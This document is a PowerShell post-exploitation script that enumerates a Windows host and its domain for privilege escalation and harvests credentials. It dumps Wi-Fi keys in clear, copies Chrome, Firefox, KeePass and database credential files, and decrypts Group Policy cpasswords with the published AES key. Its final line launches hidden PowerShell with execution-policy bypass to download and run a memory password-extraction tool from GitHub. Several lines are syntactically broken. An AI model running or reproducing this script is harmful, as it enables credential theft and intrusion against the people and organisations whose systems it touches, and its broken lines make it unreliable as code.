# Variables
$sw = [Diagnostics.Stopwatch]::StartNew()
$user=$env:username
$results = C:\Users\$user\Escalation

echo "****************** sys_info ************************" | Out-File $results\test.txt
systeminfo /fo list | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append;

echo "**** Dump of Current User Path ****" | Out-File $results\test.txt -Append
($env:Path).Replace(';',"`r`n") | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

echo "**** Dump of Current Processes ****" | Out-File $results\test.txt -Append
tasklist /v | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

echo "**** Dump of GPO ****" | Out-File $results\test.txt -Append
gpresult /z | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

echo "**** Dump of DNS Sites Visited ****" | Out-File $results\test.txt -Append
ipconfig /displaydns | select-string 'Record Name' | foreach-object { $_.ToString().Split(' ')[-1]   } | Sort | Out-Gridview | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

echo "**** Scheduled Tasks ****" | Out-File $results\test.txt -Append
schtasks /query /fo list /v | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

echo "**** Vulnerable Services ****" | Out-File $results\test.txt -Append
c:\windows\system32\sc qc Spooler | Out-File $results\test.txt -Append
c:\windows\system32\sc qc IKEEXT | Out-File $results\test.txt -Append
c:\windows\system32\sc qc upnphost | Out-File $results\test.txt -Append

# Auto Start files. Search for missing files that don't use a explicit path.
# c:\sysinternals\autorunsc.exe -a | findstr /n /R "File\ not\ found" 
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup" | Out-File $results\test.txt -Append
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | Out-File $results\test.txt -Append
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run" | Out-File $results\test.txt -Append
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | Out-File $results\test.txt -Append
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" | Out-File $results\test.txt -Append
dir "C:\Users\U507654\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" | Out-File $results\test.txt -Append
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" | Out-File $results\test.txt -Append
reg query "HKLM\System\CurrentControlSet\Services" | Out-File $results\test.txt -Append

echo "**** List Shadow Copies ****"  | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

# Requires Admin privs
vssadmin list shadows | Out-File $results\test.txt -Append
echo "**** List Kerberos Tickets ****" | Out-File $results\test.txt -Append
klist | Out-File $results\test.txt -Append
echo "**** List Drivers for Potential DLL Injection ****" | Out-File $results\test.txt -Append
driverquery /v | Out-File $results\test.txt -Append
echo "**** Run DsQuery to List DCs ****" | Out-File $results\test.txt -Append

# DsQuery only works on servers and Windows 8 natively.
# dsquery Server -Forest | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

echo "******************* User info ***********************" | Out-File $results\test.txt -Append
[Environment]::UserName | Out-File $results\test.txt -Append

# Domain requests can be VERY slow (hours) in large domains.
#net user /domain | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append
#net group /domain | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

echo "**** Domain Administrators ****" | Out-File $results\test.txt -Append
net group "Domain Admins" /domain | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

echo "**** Exchange Trusted Subsystem ****" | Out-File $results\test.txt -Append
#net group "Exchange Trusted Subsystem" /domain | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

echo "**** Dump Account Security Settings ****" | Out-File $results\test.txt -Append
net accounts /domain | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

echo "**** Dump All Domain Users ****" | Out-File $results\test.txt -Append
#net user /domain | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

echo "**** Dump Local Administrators ****" | Out-File $results\test.txt -Append
net localgroup administrators | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

echo "******************* ip_info ***********************" | Out-File $results\test.txt -Append
ipconfig /all | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append
netstat -ano | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append
route print | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append
arp -a | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append
tracert -d -h 15 8.8.8.8 | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

echo "******************* firewall_info ***********************" | Out-File $results\test.txt -Append
netsh advfirewall show allprofiles | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append
netsh firewall show config  | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

echo "**** Vulnerable Unquoted Services****" | Out-File $results\test.txt -Append
wmic service get name,displayname,pathname,startmode | findstr /I "Auto" | findstr /i /v "c:\windows\\" | findstr /i /v /l '\"' | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

echo "WMI Dump of Patches and When They Were Installed"  | Out-File $results\test.txt -Append
wmic qfe get Caption,Description,HotFixID,InstalledOn | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

echo "**************** reg_query ************************" | Out-File $results\test.txt -Append
reg query "HKCU\Software\Microsoft\Terminal Server Client\Default" | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

echo "**** Can Normal Users Install Apps *****" | Out-File $results\test.txt -Append
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

echo "**** RDP Port****" | Out-File $results\test.txt -Append
# Requires Admin Privs
reg query "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

# Dump Wireless passwords in clear. Wireless adapter has to be enabled. Must be run as admin.
$wlans = netsh wlan show profiles | Select-String -Pattern "All User Profile" | Foreach-Object {$_.ToString()}
$exportdata = $wlans | Foreach-Object {$_.Replace("    All User Profile     : ",$null)}
$exportdata | ForEach-Object {netsh wlan show profiles name="$_" key=clear}

echo "**** Files That Store Passwords ****" | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

    echo "**** c:\Windows\Panther\unattend.xml ****" | Out-File $results\test.txt -Append
    Select-String -SimpleMatch "==</Value>" -Path "c:\Windows\Panther\unattend.xml" -Context 4,0  | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append

    echo "**** c:\Windows\Panther\Unattend\unattend.xml ****" | Out-File $results\test.txt -Append
    Select-String -SimpleMatch "==</Value>" -Path ":\Windows\Panther\Unattend\unattend.xml" -Context 4,0  | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append

    echo "**** c:\Windows\System32\unattend.xml ****" | Out-File $results\test.txt -Append
    Select-String -SimpleMatch "==</Value>" -Path "c:\Windows\System32\unattend.xml" -Context 4,0  | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append

    echo "**** c:\Windows\System32\sysprep\unattend.xmls ****" | Out-File $results\test.txt -Append
    Select-String -SimpleMatch "==</Value>" -Path "C:\windows\System32\sysprep\unattend.xml" -Context 4,0 | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append

    dir c:\*vnc.ini /s /b | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append
    dir c:\*ultravnc.ini /s /b | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append
    dir c:\ /s /b | findstr /si *vnc.ini | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append
    dir c:\ /s /b | findstr /si *.ps1 | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append
    # Use bin2dmp.exe "wsrv2008r2-1.vmem" vmware.dmp to convert to dump file then extract passwords from memory
    dir c:\ /s /b | findstr /si *.vmem | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append
    dir c:\ /s /b | findstr /si *.rdp | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append
    dir c:\ /s /b | findstr /si web.config | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append
    dir c:\ /s /b | findstr /si SiteList.xml | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append
    dir c:\ /s /b | findstr /si *.cmd | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append

    findstr /si password *.txt | *.xml | *.ini | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append
    findstr /si pass *.txt | *.xml | *.ini | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append
    reg query "HKCU\Software\ORL\WinVNC3\Password" | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append
    # Windows 7 Autologon. Unlikely in a domain. AutoAdminLogon = 1 means it is enabled. DefaultPassword is where the password is stored.
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append
    reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append
    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append

    # IE Password file
    reg query "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append
    reg query  "HKCU\Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2" | Out-File $results\test.txt -Append
    echo `r`n | Out-File $results\test.txt -Append

    # Chrome Password file
    Copy-Item "C:\Users\$user\AppData\Local\Google\User Data\Default\Login Data\*" $results\Chrome
    Copy-Item "C:\documents and settings\$user\Local Settings\Application Data\Google\Chrome\User Data\Default\Login Data\*" $results\Chrome 
    echo `r`n | Out-File $results\test.txt -Append

    # Firefox Password file
    Copy-Item "C:\Documents and Settings\$user\Application Data\Mozilla\Firefox\Profiles\" -Recurse $results\Firefox
    Copy-Item "C:\Users\$user\AppData\Roaming\Mozilla\Firefox\Profiles\" -Recurse $results\Firefox
    echo `r`n | Out-File $results\test.txt -Append
        <#
        •key3.db - Key database 
        •signons.txt - Previous to 2.0.0.2 - Encrypted saved passwords, requires key3.db to work 
        •signons2.txt - 2.0.0.2 and above - Encrypted saved passwords (and URL exceptions where "NEVER SAVE PASSWORD" is selected), requires key3.db to work
        •signons3.txt - 3.0 and above - Encrypted saved passwords (and URL exceptions where "NEVER SAVE PASSWORD" is selected), requires key3.db to work
        •signons.sqlite - 3.5 and above - Encrypted saved passwords (and URL exceptions where "NEVER SAVE PASSWORD" is selected), requires key3.db to work.
        #>

    # KeePass
    Copy-Item C:\Users\$user\AppData\Roaming\KeePass\* $results\KeePass

    # IIS. Requires Admin privs (Untested)
    cat C:\Windows\System32\inetsrv\config\applicationHost.config | Out-File $results\test.txt -Append
    cat C:\Windows\System32\Microsoft.NET\Framework\framework_version\CONFIG\machine.config  | Out-File $results\test.txt -Append
    cat C:\Windows\System32\Microsoft.NET\Framework\framework_version\CONFIG\web.config  | Out-File $results\test.txt -Append
    cat C:\Inetsrv\*\web.config  | Out-File $results\test.txt -Append
    cat C:\Windows\SysWOW64\inetsrv\Config\web.config | Out-File $results\test.txt -Append

    # ManageEngine Password Manager Pro (Untested)
    Copy-Item C:\ManageEngine\PMP\conf\pmp_key.key $results\PMP
    Copy-Item C:\ManageEngine\PMP\conf\manage_key.conf $results\PMP
    Copy-Item C:\ManageEngine\PMP\conf\database_params.conf $results\PMP

    # Mysql (Untested)
    Copy-Item C:\Program Files\MySQL\MySQL Server 5.\[0..9\]\my.ini $results\Mysql

    # MSSQL (Untested)
    Copy-Item C:\Program Files\Microsoft SQL Server\MSSQL13.*\ConfigurationFile.ini $results\MSSQL
    Copy-Item C:\Program Files\Microsoft SQL Server\100\Setup Bootstrap\Log\*\ConfigurationFile.ini $results\MSSQL


    # Oracle (Untested)



echo `r`n | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append

# Function to search for Cpasswords in GPOs. THis can take a lot of time in large organizations.
function Get-GPPPassword {
[CmdletBinding()] 
Param () 
     
#Some XML issues between versions 
    Set-StrictMode -Version 2 
      
     #define helper function that decodes and decrypts password 
     function Get-DecryptedCpassword { 
         [CmdletBinding()] 
         Param ( 
             [string] $Cpassword  
         ) 
 
         try { 
             #Append appropriate padding based on string length   
             $Mod = ($Cpassword.length % 4) 
              
             switch ($Mod) { 
             '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)} 
             '2' {$Cpassword += ('=' * (4 - $Mod))} 
             '3' {$Cpassword += ('=' * (4 - $Mod))} 
             } 
 
             $Base64Decoded = [Convert]::FromBase64String($Cpassword) 
              
             #Create a new AES .NET Crypto Object 
             $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider 
             [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8, 
                                  0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b) 
              
             #Set IV to all nulls to prevent dynamic generation of IV value 
             $AesIV = New-Object Byte[]($AesObject.IV.Length)  
             $AesObject.IV = $AesIV 
             $AesObject.Key = $AesKey 
             $DecryptorObject = $AesObject.CreateDecryptor()  
             [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length) 
              
             return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock) 
         }  
          
         catch {Write-Error $Error[0]} 
     }   
      
     #define helper function to parse fields from xml files 
     function Get-GPPInnerFields { 
     [CmdletBinding()] 
         Param ( 
             $File  
         ) 
      
         try { 
              
             $Filename = Split-Path $File -Leaf 
             [xml] $Xml = Get-Content ($File) 
 

             #declare empty arrays 
             $Cpassword = @() 
             $UserName = @() 
             $NewName = @() 
             $Changed = @() 
             $Password = @() 
      
            #check for password field 
             if ($Xml.innerxml -like "*cpassword*"){ 
              
                 Write-Verbose "Potential password in $File" 
                  
                 switch ($Filename) { 
 
                     'Groups.xml' { 
                         $Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                         $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                         $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                         $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                     } 
          
                     'Services.xml' {   
                         $Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                         $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                         $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                     } 
          
                     'Scheduledtasks.xml' { 
                         $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                         $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                         $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                     } 
          
                     'DataSources.xml' {  
                         $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                         $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                         $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                           
                     } 
                      
                     'Printers.xml' {  
                         $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                         $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                         $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                     } 
    
                     'Drives.xml' {  
                         $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                         $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                         $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}  
                     } 
                 } 
            } 
                       
            foreach ($Pass in $Cpassword) { 
                Write-Verbose "Decrypting $Pass" 
                $DecryptedPassword = Get-DecryptedCpassword $Pass 
                Write-Verbose "Decrypted a password of $DecryptedPassword" 
                #append any new passwords to array 
                $Password += , $DecryptedPassword 
            } 
              
             #put [BLANK] in variables 
             if (!($Password)) {$Password = '[BLANK]'} 
             if (!($UserName)) {$UserName = '[BLANK]'} 
             if (!($Changed)) {$Changed = '[BLANK]'} 
             if (!($NewName)) {$NewName = '[BLANK]'} 
                    
             #Create custom object to output results 
             $ObjectProperties = @{'Passwords' = $Password; 
                                   'UserNames' = $UserName; 
                                   'Changed' = $Changed; 
                                   'NewName' = $NewName; 
                                   'File' = $File} 
                  
             $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties 
             Write-Verbose "The password is between {} and may be more than one value." 
             if ($ResultsObject) {Return $ResultsObject}  
         } 
 
         catch {Write-Error $Error[0]} 
     } 
      
     try { 
         #ensure that machine is domain joined and script is running as a domain account 
         if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) { 
             throw 'Machine is not a domain member or User is not a member of the domain.' 
         } 
      
         #discover potential files containing passwords ; not complaining in case of denied access to a directory 
         Write-Verbose 'Searching the DC. This could take a while.' 
         $XMlFiles = Get-ChildItem -Path "\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' 
      
         if ( -not $XMlFiles ) {throw 'No preference files found.'} 
 

         Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords." 
      
         foreach ($File in $XMLFiles) { 
             $Result = (Get-GppInnerFields $File.Fullname) 
             Write-Output $Result 
         } 
     } 
 
 
     catch {Write-Error $Error[0]} 
 } 

 echo "GPPPassword scanning...."
 Get-GPPPassword | Out-File $results\test.txt -Append

# Mattifistation's Script
function Get-AssociatedClassRelationship {

    param (

        [String]

        $Namespace = 'root/cimv2'

    )




    Get-CimClass -Namespace $Namespace | ? { $_.CimClassQualifiers['Association'] -and (-not $_.CimClassQualifiers['Abstract']) } | % {

        $KeyQualifiers = @($_.CimClassProperties | ? { $_.Qualifiers['key'] })




        if ($KeyQualifiers.Count -eq 2) {

            $Properties = [Ordered] @{

                AssociationClassName = $_.CimClassName

                LinkedClassName1 = $KeyQualifiers[0].ReferenceClassName

                LinkedClassName2 = $KeyQualifiers[1].ReferenceClassName

            }




            New-Object PSObject -Property $Properties

        }

    }

}
echo "Enumerating all association classes...."
Get-AssociatedClassRelationship | Out-File $results\test.txt -Append

# From Nishang Get-Information.ps1
function registry_values($regkey, $regvalue,$child) 
    { 
        if ($child -eq "no"){$key = get-item $regkey} 
        else{$key = get-childitem $regkey} 
        $key | 
        ForEach-Object { 
        $values = Get-ItemProperty $_.PSPath 
        ForEach ($value in $_.Property) 
        { 
        if ($regvalue -eq "all") {$values.$value} 
        elseif ($regvalue -eq "allname"){$value} 
        else {$values.$regvalue;break} 
        }}} 
    $output = "Logged in users:`n" + ((registry_values "hklm:\software\microsoft\windows nt\currentversion\profilelist" "profileimagepath") -join "`r`n") 
    $output = $output + "`n`n Powershell environment:`n" + ((registry_values "hklm:\software\microsoft\powershell" "allname")  -join "`r`n") 
    $output = $output + "`n`n Putty trusted hosts:`n" + ((registry_values "hkcu:\software\simontatham\putty" "allname")  -join "`r`n") 
    $output = $output + "`n`n Putty saved sessions:`n" + ((registry_values "hkcu:\software\simontatham\putty\sessions" "all")  -join "`r`n") 
    $output = $output + "`n`n Recently used commands:`n" + ((registry_values "hkcu:\software\microsoft\windows\currentversion\explorer\runmru" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Shares on the machine:`n" + ((registry_values "hklm:\SYSTEM\CurrentControlSet\services\LanmanServer\Shares" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Environment variables:`n" + ((registry_values "hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n More details for current user:`n" + ((registry_values "hkcu:\Volatile Environment" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n SNMP community strings:`n" + ((registry_values "hklm:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n SNMP community strings for current user:`n" + ((registry_values "hkcu:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Installed Applications:`n" + ((registry_values "hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" "displayname")  -join "`r`n") 
    $output = $output + "`n`n Installed Applications for current user:`n" + ((registry_values "hkcu:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" "displayname")  -join "`r`n") 
    $output = $output + "`n`n Domain Name:`n" + ((registry_values "hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History\" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Contents of /etc/hosts:`n" + ((get-content -path "C:\windows\System32\drivers\etc\hosts")  -join "`r`n") 
    $output = $output + "`n`n Running Services:`n" + ((net start) -join "`r`n") 
    $output = $output + "`n`n Account Policy:`n" + ((net accounts)  -join "`r`n") 
    $output = $output + "`n`n Local users:`n" + ((net user)  -join "`r`n") 
    $output = $output + "`n`n Local Groups:`n" + ((net localgroup)  -join "`r`n") 
    $output = $output + "`n`n WLAN Info:`n" + ((netsh wlan show all)  -join "`r`n") 
    $output | Out-File $results\test.txt -Append


}

# Run mimikittenz powershell to extract passwords from memory.
powershell.exe -w hidden -nop -ep bypass -c "IEX (('new-object net.webclient).downloadstring(https://github.com/putterpanda/mimikittenz/raw/master/Invoke-mimikittenz.ps1'))"

#Stop timer
$sw.Stop()
echo "The script took $($sw.Elapsed) minutes to run." | Out-File $results\test.txt -Append
echo `r`n | Out-File $results\test.txt -Append
